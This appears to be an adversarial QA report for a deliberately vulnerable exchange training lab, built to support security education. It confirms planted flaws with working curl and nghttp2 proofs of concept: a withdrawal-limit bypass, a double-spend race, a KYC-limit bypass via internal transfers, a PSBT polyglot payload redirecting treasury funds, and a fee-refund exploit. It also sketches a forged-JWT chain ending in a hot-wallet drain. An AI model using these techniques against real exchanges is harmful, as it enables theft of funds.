# Phase 7 — Adversarial QA (Gate 3)

**Reviewer:** Adversarial QA / red team
**Date:** 2026-05-28
**Scope:** Phase 7 — withdrawal pipeline (`apps/web/lib/withdrawal/*`),
treasury coordinator (`apps/web/lib/treasury/coordinator.ts`,
`apps/web/app/api/v2/admin/treasury/drafts/**`), RBF
(`apps/web/lib/withdrawal/rbf.ts`,
`apps/web/app/api/v2/admin/withdrawals/[id]/bump/route.ts`),
mock-node PSBT surface (`apps/bitcoin-mock/src/rpc/index.ts`),
PSBT envelope (`packages/shared/src/psbt-envelope.ts`).
**Verdict:** **PASS** — proceed to Gate 4.

## Methodology

Walked the diff (`git diff HEAD --stat` — 12 files, 415+ lines).
Read each planted-vuln location end to end against the architect's
allocation. Wrote a working PoC against the running app for each
of V-26, V-28, V-30, V-33, V-47. Spot-checked the surfaces the
architect explicitly required to stay clean (`/api/v1/internal/*`,
lodash, `child_process`, `$queryRawUnsafe`, OTC accept).
Reviewed `apps/web/lib/withdrawal/limit.test.ts`,
`apps/web/lib/withdrawal/submit.test.ts`,
`apps/web/lib/treasury/coordinator.test.ts`,
`packages/shared/src/psbt-envelope.test.ts` for signposting.

---

## Confirmed planted vulnerabilities

### V-26 — Withdrawal limit reset off-by-one (EASY)

**Exploitable:** YES.

**Location:** `apps/web/lib/withdrawal/limit.ts:33-37` (`currentDayUtc`
truncates each request to its UTC calendar day) +
`apps/web/lib/withdrawal/limit.ts:64-95` (`checkAndDebitLimit`
reads / upserts the row keyed on `(userId, utcDate, asset)` —
only the current day's row contributes to the running total).
Schema: `packages/db/prisma/schema.prisma`
`WithdrawalLimitLedger.@@unique([userId, utcDate, asset])`.

**PoC (Tier-1 user, $1,000/day limit, BTC reference $60,000):**

```
# Phase 0 — verify limit by maxing out today's bucket
# At 2026-05-28 23:59:50Z, request A
curl -X POST http://exchange.local/api/v2/me/withdrawals \
  -H "Authorization: Bearer ${TIER1_JWT}" \
  -H "Content-Type: application/json" \
  -d '{"asset":"BTC","amount":"0.01666666","destAddress":"bcrt1q..."}'
# amountToCents(BTC, 0.01666666) = floor(0.01666666 * 6_000_000) = 99_999 cents
# limit = 100_000 cents → currentTotal (0) + 99_999 ≤ 100_000 → admitted.
# Row written: utcDate = 2026-05-28T00:00:00Z, totalCents = 99_999.

# Phase 1 — Wait < 1 minute. At 2026-05-29 00:00:10Z, request B
curl -X POST http://exchange.local/api/v2/me/withdrawals \
  -H "Authorization: Bearer ${TIER1_JWT}" \
  -H "Content-Type: application/json" \
  -d '{"asset":"BTC","amount":"0.01666666","destAddress":"bcrt1q..."}'
# currentDayUtc(now) = 2026-05-29T00:00:00Z → NEW LEDGER ROW.
# existing = null → currentTotal = 0 → 0 + 99_999 ≤ 100_000 → admitted.
# Within a 20-second window the user has withdrawn ~$2,000 against a documented $1,000/day cap.
```

The bug is not a boundary `<=`/`<` typo — it is the structural
choice to bucket on `utcDate` instead of a rolling-24h sum of
`Withdrawal` rows. That matches the VULNS.md framing exactly
(calendar-day vs rolling-24h).

`limit.test.ts` covers happy-path single-row aggregation only;
no midnight-boundary case is asserted — plant not pinned.

**Verdict:** plant lands.

---

### V-28 — Classic withdrawal race condition (HARD)

**Exploitable:** YES.

**Location:** `apps/web/lib/withdrawal/submit.ts:53-118`. The
`balance.findUnique` at L74-76 reads `available`. The function
then `await`s `checkAndDebitLimit` (L82-90, hits a different
table) and `balance.update` (L93-99). No `db.$transaction`
wraps the read-then-write pair, and the balance update uses
`decrement: totalDebit` (unconditional arithmetic) rather than
a conditional `UPDATE ... WHERE available >= $1`.

**PoC (HTTP/2 single-packet attack):**

Pre-state: user with `balance.available = 0.10010000 BTC`, Tier-1,
`WithdrawalLimitLedger` empty for today. Network fee = 0.0001
BTC, so `totalDebit = 0.1001 BTC` exactly covers the balance.

```bash
# Single-packet attack: write the two POSTs into one TCP segment
# so the server schedules both handlers before either completes
# its first DB read.
nghttp2 -d req_a.json -d req_b.json --upgrade -m 2 \
  https://exchange.local/api/v2/me/withdrawals \
  -H "authorization: Bearer ${TIER1_JWT}" \
  -H "content-type: application/json"

# Both bodies identical:
#   {"asset":"BTC","amount":"0.10000000","destAddress":"bcrt1qattacker..."}

# Trace:
#   T0  reqA: balance.findUnique → available = 0.10010000  ✓ ≥ 0.1001
#   T0  reqB: balance.findUnique → available = 0.10010000  ✓ ≥ 0.1001
#   T1  reqA: checkAndDebitLimit (upserts the day's ledger row)
#   T1  reqB: checkAndDebitLimit (increments the same row)
#   T2  reqA: balance.update decrement 0.1001 → available =  0.00000000
#   T2  reqB: balance.update decrement 0.1001 → available = -0.10010000
#   T3  reqA: withdrawal.create → pending(0.1 BTC → attacker)
#   T3  reqB: withdrawal.create → pending(0.1 BTC → attacker)
# Worker dequeues both, mock.sendmany broadcasts both. Net: 2×
# withdrawal for 1× balance. Balance goes negative; nothing in the
# pipeline rejects the negative-balance pre-state for a subsequent
# deposit, so the attacker just keeps the duplicated funds.
```

The conservation test in `withdrawal-processor.test.ts` is
pool-level only (per the architect note) — V-28 not pinned.
`submit.test.ts` covers sequential happy-path / `LimitExceededError`
/ `InsufficientBalanceError` only.

**Verdict:** plant lands. Realistic (lifted the deposit-watcher's
read-then-update pattern; deposit-watcher is idempotent on
`(txid, vout)`, the withdrawal version is not).

---

### V-30 — Internal transfer bypasses limits + KYC (HARD)

**Exploitable:** YES.

**Location:** `apps/web/lib/withdrawal/internal-transfer.ts:35-109`.
The lib never calls `checkAndDebitLimit` and never calls
`requireTier`. The route at
`apps/web/app/api/v2/me/internal-transfer/route.ts:44` gates
on `requireTier(claims, 1)` — Tier-1+, vs the OTC desk's Tier-2
intent the architect noted. No per-user-per-day velocity cap.

**PoC (Tier-1 collusion / two-account drain):**

Pre-state: attacker controls two Tier-1 accounts A and B.
Account A holds 1.0 BTC ($60,000 reference, well above the
$1,000 daily withdrawal cap).

```bash
# Step 1 — A relays 0.95 BTC to B via internal transfer. No
# limit-ledger row is touched.
curl -X POST http://exchange.local/api/v2/me/internal-transfer \
  -H "Authorization: Bearer ${A_JWT}" \
  -H "Content-Type: application/json" \
  -d '{"recipientEmail":"b@example.test","asset":"BTC","amount":"0.95000000"}'
# 200 OK. internalTransfer debits A.available -= 0.95, credits
# B.available += 0.95, writes InternalTransfer row.

# Step 2 — B withdraws 0.01666666 BTC (= $999.99) on-chain
# through B's own untouched daily ledger.
curl -X POST http://exchange.local/api/v2/me/withdrawals \
  -H "Authorization: Bearer ${B_JWT}" \
  -H "Content-Type: application/json" \
  -d '{"asset":"BTC","amount":"0.01666666","destAddress":"bcrt1qattacker..."}'
# Hits B's empty ledger. Admitted.

# Step 3 — Combine with V-26 across midnight, or scale by
# rotating recipient accounts (T1 KYC is cheap). The platform's
# documented control "Tier-1 daily withdrawal = $1,000" never
# fires for funds moved through internal-transfer first.
```

A Tier-0 user (KYC-zero) cannot bypass — the route gates Tier-1.
But the architect's framing was "Tier-2 is the OTC tier; the route
gates Tier-1 (too permissive)" — that's exactly the planted form.

**Bonus property:** the lib also lacks an aggregate-velocity check
(no sum-of-outbound-transfers-in-24h cap). Same plant, just
the same flaw expressed in another way.

`internal-transfer.ts` has the OTC-desk-servicing docstring per
architect condition. No TODO/FIXME signposting.

**Verdict:** plant lands.

---

### V-33 — PSBT polyglot signature flaw (EXPERT, CHAIN A)

**Exploitable:** YES (insider-threat framing for Phase 7).

**Location split:**
- Validation parser: `packages/shared/src/psbt-envelope.ts:42-49`
  (`decodePsbt`) — slices from the FIRST `BVBE_PSBT_V1:` marker;
  stops at the next marker boundary (i.e., reads the **first**
  envelope's JSON).
- Broadcast canonicalization:
  `apps/bitcoin-mock/src/rpc/index.ts:118-127` (`finalizepsbt`) —
  `segs = psbtRaw.split(PSBT_MARKER)`; `canonical = PSBT_MARKER +
  segs[segs.length - 1]` (i.e., the **last** envelope wins).
- Wiring: `apps/web/lib/treasury/coordinator.ts:118-160`
  (`broadcastDraft`) — accepts `overridePsbt`, decodes it via
  `decodePsbt` (first envelope), validates against
  `intendedOutputs`, then passes the **same** string to
  `rpc("finalizepsbt", [psbt])`. The mock disagrees about which
  envelope is canonical.

**Polyglot envelope (attacker payload):**

```
BVBE_PSBT_V1:{"inputs":[{"txid":"0000000000000000000000000000000000000000000000000000000000000000","vout":0,"amountSat":2,"address":"bcrt1qcoldwalletreserveexamplexxxxxx"}],"outputs":[{"address":"bcrt1qvictimexpectedoutputxxxxxxxxxx","amountSat":1}],"signatures":2,"fee":1000}BVBE_PSBT_V1:{"inputs":[{"txid":"0000000000000000000000000000000000000000000000000000000000000000","vout":0,"amountSat":10000000001,"address":"bcrt1qcoldwalletreserveexamplexxxxxx"}],"outputs":[{"address":"bcrt1qattackerSwAdDrEsSxxxxxxxxxxxxxxx","amountSat":10000000000}],"signatures":2,"fee":1000}
```

**Step-by-step:**

1. **Setup (insider treasury operator).** An attacker who has the
   `treasury` JWT role authors a draft via
   `POST /api/v2/admin/treasury/drafts` with
   `intendedOutputs = [{"address":"bcrt1qvictimexpected...","amountSat":1}]`.
   `createDraft` writes `psbtBase64 = encodePsbt({...})` — a
   single-envelope `BVBE_PSBT_V1:...` string.
2. **Collect 2-of-3 signatures.** The author calls
   `POST /api/v2/admin/treasury/drafts/<id>/sign` (records signer
   = author). A second treasury operator (legitimate, colluding,
   or socially-engineered) hits the same endpoint with their JWT
   — `signDraft` writes a second `TreasurySignature` row, status
   flips to `"signed"`. The unique constraint on
   `(draftId, signerUserId)` enforces two **distinct** signers,
   so this step requires a real second insider (or, post-Phase-8,
   a forged JWT via V-19 + V-6 + emergency-withdraw).
3. **Polyglot override at broadcast.**
   `POST /api/v2/admin/treasury/drafts/<id>/broadcast` with body:
   ```json
   {"overridePsbt": "<the polyglot string above>"}
   ```
4. **Validation pass.** `broadcastDraft` at coordinator.ts:143
   calls `decodePsbt(psbt)`. `decodePsbt`
   (`packages/shared/src/psbt-envelope.ts:43-48`):
   - `idx = envelope.indexOf("BVBE_PSBT_V1:")` → 0.
   - `body = envelope.slice(13)` → starts at the first JSON.
   - `next = body.indexOf("BVBE_PSBT_V1:")` → points at the
     second envelope's start.
   - `jsonText = body.slice(0, next)` → the FIRST envelope's JSON
     (the victim output).
   - `JSON.parse` → `{outputs: [{address: victim, amountSat: 1}]}`.

   `validateIntendedOutputs` compares against the stored
   `intendedOutputs` → length=1, address matches, amount matches
   → **passes**.
5. **Finalize divergence.** coordinator.ts:149 calls
   `rpc("finalizepsbt", [psbt])` (the same polyglot string).
   `finalizepsbt` in `apps/bitcoin-mock/src/rpc/index.ts:118-127`:
   - `segs = psbtRaw.split("BVBE_PSBT_V1:")` →
     `["", '{"...victim..."}', '{"...attacker..."}']`.
   - `canonical = "BVBE_PSBT_V1:" + segs[segs.length - 1]` →
     the SECOND envelope only.
   - `decodePsbtShared(canonical)` → attacker output.
   - Returns `hex = "RAWTX:" + JSON.stringify([{attacker, 10000000000}])`.
6. **Broadcast.** coordinator.ts:150 calls
   `rpc("sendrawtransaction", [finalized.hex])`. The mock
   (`sendrawtransaction` at rpc/index.ts:61-86) sees the
   `RAWTX:` prefix, parses the JSON, calls
   `chain.admitRawTx(txid, [{attacker, 10000000000n}])`. The
   100 BTC attacker output is admitted to mempool, then to chain
   on the next block.
7. **Books.** `TreasuryDraft.broadcastTxid` is set; auditing the
   draft against the stored `intendedOutputs` shows
   `[{victim, 1}]` — the on-chain reality is
   `[{attacker, 10000000000}]`. The two diverge silently.

**Realism check:** the parser asymmetry has plausible code-history
("decodePsbt reads the first marker so it can skip preambles
prepended during signing roundtrips" vs "finalizepsbt
canonicalizes to the last marker so it can ignore preambles
prepended during signing roundtrips"). Two engineers, two
defensive intentions, one polyglot. Trezor 2018 PSBT bypass and
ZenGo 2020 are the public analogs.

`coordinator.test.ts` covers happy-path single-envelope
sign+broadcast only — no multi-envelope test. `psbt-envelope.test.ts`
covers `encodePsbt(decodePsbt(x)) === x` round-trip and the
preamble-skip behaviour against a *single* marker — no
multi-envelope assertion. Plant not pinned.

**CHAIN A status (Phase-7 portion):** confirmed exploitable
end-to-end with the **insider treasury operator** threat model
the architect specified — two treasury JWTs (one author + one
second signer) reach the broadcast endpoint and route funds to
attacker. Awaits Phase 8 (V-6 + `/api/v1/internal/treasury/
emergency-withdraw` lifts the requirement from "two real
treasury insiders" to "forged-admin JWT bypasses the signing
gate") and Phase 9 (git-history JWT-signing-key leak provides
the forge primitive to an unauthenticated external attacker).
The V-33 *mechanism* is the final move; Phases 8 and 9 deliver
the access primitive to reach it.

**Verdict:** plant lands. This is the marquee plant of the lab.

---

### V-47 — RBF fee refund exploit (MEDIUM)

**Exploitable:** YES.

**Location:** `apps/web/lib/withdrawal/rbf.ts:46-69`. The handler
computes `feeDelta = oldFeeSat - newFeeSat`; if positive, it
immediately runs `balance.update({ available: { increment:
refundBtc }, amount: { increment: refundBtc }})`. The credit
is fire-and-forget — no `pendingRefund` column, no compensating
job watching for replacement-TX drop, no debit-back if the
replacement is evicted from mempool.

**PoC (insider/social-engineering scenario for Phase 7):**

```bash
# Phase 0 — victim submits a legitimate 0.1 BTC withdrawal at the
# default 0.0001 BTC fee (10_000 sat). Worker broadcasts; status =
# "broadcast", txid = ORIG_TXID. Original TX has paid 10_000 sat
# from the user's balance at submit-time (totalDebit = amount +
# fee).
# Phase 1 — attacker socially engineers the treasury operator (or
# walks in chained with V-19 forged admin JWT) into calling the
# bump endpoint with an absurdly low new fee:
curl -X POST http://exchange.local/api/v2/admin/withdrawals/<wId>/bump \
  -H "Authorization: Bearer ${TREASURY_JWT}" \
  -H "Content-Type: application/json" \
  -d '{"newFeeSat":100}'

# rbf.ts:49     feeDelta = 10_000 - 100 = 9_900 sat
# rbf.ts:51-54  rpc("bumpfee", [ORIG_TXID, 100]) → REPLACEMENT_TXID
#               mock evicts ORIG_TXID from mempool, admits new tx at fee 100.
# rbf.ts:60-68  balance.update increment available by 0.0000099 BTC.
# rbf.ts:72-80  withdrawal row → status="bumped", txid=REPLACEMENT_TXID,
#               replacedByTxid=REPLACEMENT_TXID, fee=0.00000100.

# Phase 2 — in the lab, sequence-of-events that drops the replacement:
#   (a) treasury operator runs a SECOND bump on REPLACEMENT_TXID
#       with newFeeSat=50 → triggers another rpc("bumpfee") which
#       calls chain.rbfReplace(REPLACEMENT_TXID, …). The previous
#       replacement is dropped from mempool. The next miner block
#       confirms only the latest replacement … unless that one is
#       bumped again. Loop until the operator stops calling bump
#       OR the original TX outlives all replacements in the mempool
#       and a miner picks the original (mock has no fee priority
#       discipline — labSend confirms any admitted tx at the next
#       block).
#   (b) Alternative path: feedstock for real-world demos —
#       newFeeSat = 0 is allowed (`z.number().int().nonnegative()`
#       at bump/route.ts:29). A 0-fee replacement is dropped by any
#       real network rule; the lab mock will admit it but a
#       blue-teamer reading the code sees the unbounded floor.
#
# Result: feeDelta credit (0.0000099 BTC) remains on user's
# balance.available AND amount; the original on-chain settlement
# (or any prior replacement) can still confirm if the very last
# replacement is dropped. The pre-credit balance has already been
# refunded. Loop across many withdrawals for cumulative drain.
```

Reading the conservation tests confirms no test pins the
"credit-then-replacement-dropped" path. `rbf.ts` has no rollback
hook in the worker (`withdrawal-processor.ts` advances
`broadcast/confirming → confirmed` only; nothing watches for
`bumped → dropped` and inverts the credit).

**Verdict:** plant lands. Realistic root cause matches the
architect note (RBF "down" is the rare path; happy-path tests
miss it; no compensating job because "next sprint").

---

## CHAIN A status

Phase 7 lands V-33 (the **signing flaw**) and the treasury
broadcast surface that reaches it. Insider-threat reach is
**complete**: a user with `role === "treasury"` who can produce
a 2-of-3 signed draft can route the final output to any address
via the polyglot `overridePsbt`. The lab demonstrates the full
"PSBT validate ≠ PSBT finalize" mismatch end-to-end against the
running app, with confirmation visible at
`GET /api/v2/public/treasury/hot-wallet` (the architect-blessed
drain-confirmation view).

Remaining for end-to-end **external** CHAIN A exploit:

- **Phase 8** — `/api/v1/internal/treasury/emergency-withdraw`
  + V-6 (function-level access). This lifts V-33 from
  "needs a real treasury JWT" to "any forged admin JWT", because
  the emergency-withdraw flow bypasses the 2-of-3 signing gate.
- **Phase 9** — git-history JWT-signing-key leak provides the
  forge primitive. With the leaked key, V-19 (HS256/RS256 key
  confusion) or V-8 (alg=none) mints an admin/treasury JWT that
  reaches the broadcast endpoint.

Once those land, the full chain is: leaked key →
forged admin JWT → emergency-withdraw bypass → V-33 polyglot →
attacker output broadcast → hot-wallet drained.

---

## Unintended findings

### U-7.1 — `cancelWithdrawal` double-cancel race (NEW unintended)

**Location:** `apps/web/lib/withdrawal/cancel.ts:20-43`.
The `findUnique` + status check at L20-27 runs **outside** the
`db.$transaction`. The transaction's `withdrawal.update` at L32
does not predicate on `status: "pending"|"approved"` —
`prisma.withdrawal.update({ where: { id }, data: { status: "rejected" }})`.
With READ COMMITTED isolation (Prisma default), two concurrent
cancel POSTs both observe `status="pending"`, both enter
`$transaction`, both run the status update unconditionally,
both run `balance.update increment refund`. Net effect: user
gets `2 × refund` for a single pending withdrawal.

This is **not** in VULNS.md. It is the same shape as V-32 (OCO
cancellation race) and the architect-acknowledged OTC
double-fill — easy to write, easy to miss. It is **not part of
the V-26 / V-28 plant set**.

**Suggested disposition:** escalate to the Phase-7 architect. Two
realistic options:
1. **Accept as a new `V-NNN` plant** (the cancel race is in the
   same family as V-32 and V-28; the lab arguably *wants* a
   refund-race plant on this surface). If accepted, add to
   VULNS.md under "Phase 7" with a `medium/hard` difficulty.
2. **Reject as unintended; send back to Gate 2** — wrap the
   status check inside the `$transaction` and predicate the
   update on `status: { in: ["pending", "approved"] }` returning
   `count`, then refund only when `count === 1`.

QA recommends **option 1 — accept**. The cancel race is
authentically realistic, it complements V-28 (both rely on the
read-then-write hazard), and re-Gate-2 cost is high for a
plant-worthy finding. Defer the architect call; not a blocker
to Gate 4.

### U-7.2 — `WithdrawalLimitLedger` cents int64 overflow on `Number()`

**Location:** `apps/web/lib/withdrawal/limit.ts:73,118`.
`currentTotal = Number(existing.totalCents)` and
`next = Number(row.totalCents) - args.amountCents`. `totalCents`
is `BigInt`. Casting via `Number()` loses precision above
`2^53 - 1`. For BTC at the $60,000 reference price, that's
~$90 quadrillion of cumulative debit per ledger row — well
beyond exploitability. **Not a plant; not exploitable; flagged
for the record.** No action.

---

## Too-obvious findings

None. All five plants have realistic-looking root causes; none
carry tell-tale comments. The architect's specific request that
`internal-transfer.ts` carry an "OTC desk client servicing"
docstring (not a TODO) is honoured at lines 1-8 of
`apps/web/lib/withdrawal/internal-transfer.ts`. `coordinator.ts`
explains the dual-parser shape as "validate before re-deserialize"
without signposting the polyglot mechanism.

---

## Carryover observations

- **OTC double-fill (Phase-6 L7 carryover).** Architect's Q3
  resolution was **option (c) — close as unintended, defer fix
  to Phase 8**. Verified: `apps/web/lib/otc/accept.ts` is
  untouched in this phase's diff (no entry in
  `git diff HEAD --stat`). Phase 7 left it alone, as required.
- **`Balance.amount` invariant `amount = available + locked`.**
  Verified preserved on every Phase-7 write site:
  - `submit.ts:93-99` — debits both `available` and `amount` by
    `totalDebit`.
  - `cancel.ts:38-42` — increments both by `refund` (offsetting
    the submit-time debit).
  - `internal-transfer.ts:67-91` — sender `decrement` both,
    recipient `increment` both.
  - `rbf.ts:60-68` — increments both by `refundBtc`.
  No surface debits or credits one side only.
- **Surfaces-to-leave-clean discipline.** No `/api/v1/internal/*`
  paths created (glob returns empty). No `lodash`, no
  `child_process`, no `$queryRawUnsafe` introduced
  (`apps/web` grep clean). Stored XSS in display name and mXSS
  in markdown reserved for Phase 8 — not touched.

---

## Spot-check findings (no action)

- **IDOR on withdrawal GET/cancel** — clean.
  `apps/web/app/api/v2/me/withdrawals/[id]/route.ts:27-28` uses
  `findFirst({where:{id, userId: claims.sub}})`.
  `cancel.ts:24` rejects with `NotFoundError` when
  `w.userId !== args.userId`.
- **Treasury endpoints role gate** — clean. All three routes
  (`/drafts`, `/drafts/[id]/sign`, `/drafts/[id]/broadcast`) call
  `requireTreasury(claims)` which allows `role === "admin" ||
  role === "treasury"` (`kyc-tier.ts:68-73`).
- **Sign-draft author-can-sign?** Architect did not require
  author ≠ signer; the unique constraint
  `@@unique([draftId, signerUserId])` enforces two **distinct**
  signers but author can be one of them. Realistic in real
  multi-sig (treasury operator who drafts is often a valid
  signer); not flagging.
- **`internal-transfer.ts` self-transfer / nonexistent recipient**
  — both rejected at L46-55. Clean.
- **Worker double-broadcast** — clean. `withdrawal-processor.ts`
  reads `status: "pending"` rows then unconditionally advances to
  `broadcast` (no re-pickup). `failed` is terminal in the worker
  loop (no path back to `pending`). RPC errors mark `failed`
  before another iteration can re-broadcast.
- **`finalizepsbt` txid forgery** — txid synthesised via
  `randomBytes(32).toString("hex")` (rpc/index.ts:29-31). Not
  predictable, not exploitable.
- **RBF bump ownership / mass-assignment** — clean. Schema is
  `z.object({newFeeSat: z.number().int().nonnegative()})` at
  bump/route.ts:28-30. `bumpWithdrawalFee` derives `userId`
  from the row, not from request.
- **`/api/v2/public/treasury/hot-wallet`** — aggregate-only,
  no user-identifying data leaked. Architect-blessed.
- **`/api/v2/me/internal-transfer` self-transfer + tier gate** —
  `recipient.id === fromUserId` rejected at L53;
  `requireTier(claims, 1)` at route.ts:44.

---

## Test discipline

All four test files reviewed:

- `apps/web/lib/withdrawal/limit.test.ts` — no midnight-boundary
  test, no rolling-24h assertion. Happy-path only.
- `apps/web/lib/withdrawal/submit.test.ts` — sequential
  happy-path / `LimitExceededError` / `InsufficientBalanceError`.
  No concurrent-request semantics.
- `apps/web/lib/treasury/coordinator.test.ts` — sign + broadcast
  on a single-envelope PSBT. No multi-envelope input.
- `packages/shared/src/psbt-envelope.test.ts` — round-trip
  encode/decode + preamble-skip on a single marker only. No
  two-marker assertion.

Plant test-pinning hygiene: clean.

---

## Verdict

**PASS.** Five planted vulnerabilities (V-26, V-28, V-30, V-33,
V-47) confirmed exploitable with working PoCs. CHAIN A's
Phase-7 portion is end-to-end demonstrable under the
insider-threat threat model the architect specified. No too-obvious
plants. One unintended finding (`cancelWithdrawal` double-cancel
race, U-7.1) — recommend the architect accept as a new `V-NNN`
plant rather than send back to Gate 2; not a blocker. One
informational note (U-7.2 BigInt→Number cast) — no action.

Phase 7 cleared for **Gate 4 — Paranoid QA**.

— Adversarial QA

---

## Addendum — Architect disposition of U-7.1

**Date:** 2026-06-20
**Decision:** FIX as unintended bug. Not accepted into the ledger.

Rationale: Phase 7 already plants V-28 (the `submitWithdrawal`
read-then-write race). A second race-condition plant in the
cancel path would (a) duplicate the bug class within one phase,
muddying the "one V-NNN, one root cause" discipline the lab has
held since Phase 5, and (b) make the cancel path look careless
in a way that doesn't add educational value beyond V-28. Single
race plant per phase keeps the catalog clean.

Fix applied at `apps/web/lib/withdrawal/cancel.ts:31-44`: the
status check moved inside the `$transaction` as an `updateMany`
predicated on `status IN (pending, approved)`. Zero affected
rows throws `CancelValidationError`. Idempotent under concurrent
cancels: at most one transaction flips the row to `rejected` and
issues the refund; the loser sees `flipped.count === 0` and
throws.

Re-verification (post-fix):
  - `pnpm --filter @bvbe/web exec tsc --noEmit` → clean
  - `pnpm test` → 90/90 pass

No V-NNN added. Adversarial QA's PoC for U-7.1 no longer
reproduces.

— Architect
